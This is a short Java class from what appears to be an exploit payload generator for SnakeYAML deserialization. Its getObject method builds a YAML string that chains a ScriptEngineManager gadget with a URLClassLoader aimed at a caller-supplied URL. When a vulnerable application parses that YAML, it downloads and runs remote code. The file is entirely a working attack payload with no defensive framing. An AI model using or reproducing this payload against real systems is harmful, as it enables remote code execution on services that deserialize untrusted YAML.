package cn.butler.snakeyaml.payloads;

import cn.butler.payloads.ObjectPayload;

public class ScriptEngineManager implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String yamlPayload = String.format("!!javax.script.ScriptEngineManager [\n" +
            "  !!java.net.URLClassLoader [[\n" +
            "    !!java.net.URL [\"%s\"]\n" +
            "  ]]\n" +
            "]",command);
        return yamlPayload;
    }

    public static void main(final String[] args) throws Exception {
    }
}
